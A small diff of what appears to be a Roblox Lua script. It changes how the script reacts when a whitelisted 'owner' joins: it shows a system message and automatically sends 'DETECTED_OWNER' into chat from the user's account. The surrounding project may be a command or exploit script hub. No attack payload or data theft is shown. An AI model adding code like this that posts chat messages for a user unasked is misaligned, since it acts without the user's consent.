@@ -272,12 +272,14 @@ end
 spawn(function()
 	for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	if table.find(whitelist.Owners,v.UserId) then
-			sysmsg("{DETECTED} OWNER WAS IN YOU GAME") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
+			RBXSystem:DisplaySystemMessage("the owner is currently in your game")
+			game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("DETECTED_OWNER")
 		end
 	end
 	game:GetService("Players").ChildAdded:Connect(function(v)
 		if table.find(whitelist.Owners,v.UserId) then
-			sysmsg("[DETECTED] OWNER WAS IN YOU GAME!") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
+			RBXSystem:DisplaySystemMessage("the owner is currently in your game")
+			game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("DETECTED_OWNER")
 		end
 	end)
 end)
